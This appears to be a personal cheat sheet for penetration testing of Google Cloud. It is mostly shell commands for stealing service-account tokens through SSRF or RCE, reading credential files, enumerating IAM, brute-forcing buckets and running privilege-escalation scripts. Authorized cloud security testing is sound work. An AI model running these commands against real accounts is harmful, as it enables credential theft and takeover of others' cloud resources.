# GCP Pentesting

Three Main Components of Google Cloud are:
- Cloud Identity
- Google Workspace
- Google Cloud Platform 

### Reminder: Add basic concepts

## Attack Vectors

Attackers can obtain GCP credentials through multiple vectors:

- Exploiting web apps hosted on GCP
    - SSRF → Access metadata service
    - RCE → Dump environment variables, application config files, or mounted service account keys
- Open Source Intelligence (Leaked service account keys on GitHub, GitLab, or public repos)
- Phishing / Social Engineering
- Public GCS buckets containing service account keys or JSON credential files.

### Stealing Service Account Tokens via SSRF

- Send request to `http://169.254.169.254` or `http://metadata.google.internal/` along with header `Metadata-Flavor: Google`.
- Example: `http://169.254.169.254/computeMetadata/v1/instance/service-accounts/`

> Some SSRF filters only allow http://metadata.google.internal/ instead of raw IP. Both resolve to the metadata service.

### Stealing Service Account Tokens via RCE

- Check environment variables:

```shell
env | grep -i google
```

- Check for credential files:

```shell
# Kubernetes ServiceAccount token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Application default credentials
cat /etc/google/auth/application_default_credentials.json
cat /root/.config/gcloud/application_default_credentials.json

# gcloud CLI stored tokens (if installed)
cat ~/.config/gcloud/credentials.db
cat ~/.config/gcloud/access_tokens.db
```

- Query the Metadata Service (VMs, GKE, some managed services):

```shell
# List available service accounts
curl -H "Metadata-Flavor: Google" \
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/"

# Get token for the default service account
curl -H "Metadata-Flavor: Google" \
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"

# Get token for a specific service account
curl -H "Metadata-Flavor: Google" \
    "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/<service_account>/token"
```

## Authentication & Token Usage

- Login with Gmail account:

```shell
gcloug auth login
```

- Authenticate using Service Account key file:

```shell
gcloud auth activate-service-account --key-file=service_account_json_file.json
```

- Use an access token file:

```shell
gcloud <command> --access-token-file token.txt
```

- Send token directly with curl:

```shell
curl -s -X GET \
    -H "Authorization: Bearer $(cat token.txt)" \
    "https://iam.googleapis.com/v1/projects/-/serviceAccounts"
```

- Authenticate with Google HMAC credentials:

```shell
gsutil config -a
```

> By default, gsutil reuses gcloud credentials. If you want gsutil to use only HMAC creds and not your gcloud login, disable credential passing: `gcloud config set pass_credentials_to_gsutil false`


Check current authentication details:

```shell
gcloud auth list
```

Show active configuration:

```shell
gcloud config list
```


## Enumeration

### Organization Enumeration

- List organizations available to current account:

```bash
gcloud organizations list
```

- Get IAM policy for an organization:

```bash
gcloud organizations get-iam-policy <org_id>
```

- List folders under an organization:

```bash
gcloud resource-manager folders list --organization=<org_id>
```

- List projects under an organization:

```bash
gcloud projects list --filter="parent.id=<org_id>"
```

> If you have only project-level access, you may not see org info. Try enumerating projects and their parent orgs with:

```bash
gcloud projects describe <project_id> --format="value(parent.id)"
```


```shell
# Projects info
gcloud projects list
gcloud config set project <name>
gcloud projects get-iam-policy [ProjectID]
gcloud projects get-iam-policy [ProjectID] --flatten="bindings[].members" --filter="bindings.members=serviceaccount:<account_email>" --format="value(bindings.role)"

# Service accounts
gcloud iam service-accounts list
gcloud iam service-accounts get-iam-policy [Service Account Email ID]
gcloud iam service-accounts keys list --iam-account [service Account Email ID]


# iam
gcloud iam roles list
gcloud iam roles describe [roles/owner]
gcloud iam roles list --project [alert-nimbus-335411]
gcloud iam roles describe [RoleName] --project [alert-nimbus-335411]

git clone https://github.com/hac01/gcp-iam-brute.git
python3 main.py --access-token $(gcloud auth print-access-token) --project-id $(gcloud config get-value project) --service-account-email $(gcloud auth list --filter=status:ACTIVE --format="value(account)")

for sa in $(gcloud iam service-accounts list --format="value(email)"); do
  echo "[*] Checking $sa"
  gcloud iam service-accounts get-iam-policy "$sa"
  done

gcloud projects get-iam-policy <project_id> \
  --format="flattened(bindings[].members)" \
  | grep 'serviceAccount:' \
  | awk -F'serviceAccount:' '{print $2}' \
  | sort -u > serviceaccounts.txt

for sa in $(cat serviceaccounts.txt); do
echo "[*] checking $sa"
  curl -s -X POST \
    -H "Authorization: Bearer $(gcloud auth print-access-token)" \
    -H "Content-Type: application/json" \
    -d '{
          "permissions": [
            "iam.serviceAccounts.getAccessToken",
            "iam.serviceAccounts.signJwt",
            "iam.serviceAccounts.implicitDelegation",
            "iam.serviceAccounts.actAs"
          ]
        }' \
    "https://iam.googleapis.com/v1/projects/-/serviceAccounts/$sa\:testIamPermissions"
done
```

```shell
https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html
https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
https://github.com/RhinoSecurityLabs/GCPBucketBrute
https://gitlab.com/gitlab-com/gl-security/security-operations/redteam/redteam-public/pocs/gcp_enum/-/blob/master/gcp_enum.sh?ref_type=heads
```

```shell
# secret manager (`secretmanager.secretAccessor`)
gcloud secrets list
gcloud secrets versions access latest --secret="seccret_name"

# cloud sql `cloudsql.viewer`
gcloud sql instances list
mysql -h <IP> -u <username> -p

`iam.serviceAccountTokenCreator`
gcloud --impersonate-service-account="service_accpunt" auth print-access-token

`source.reader`
gcloud source repos list --access-token-file=access_token.txt

# artifact registry
gcloud artifacts repositories list
gcloud artifacts docker images list <location>-docker.pkg.dev/<project_id>/<reponame>
gcloud auth configure-docker <location>-docker.pkg.dev
docker pull <location>-docker.pkg.dev/<project_id>/<reportname>/<image_name>@sha256:<sha256_hash>

# Buckets
python3 gcpbucketbrute.py -f token_file -k <keywords> -s 10
gcloud storage ls gs://<bucket_name>

gsutil ls
gsutil ls gs://<bucket_name>

`implicit delegation`
https://raw.githubusercontent.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/refs/heads/master/ExploitScripts/iam.serviceAccounts.implicitDelegation.py:
python3 iam.serviceAccounts.implicitDelegation.py <owned_account> <target_account>

# cloud functions
gcloud functions list --access-token-file=access_token.txt
gcloud functions describe <function_name> --region=<region> --access-token-file=access_token.txt

## signjwt
https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/iam.serviceAccounts.signJWT.py

```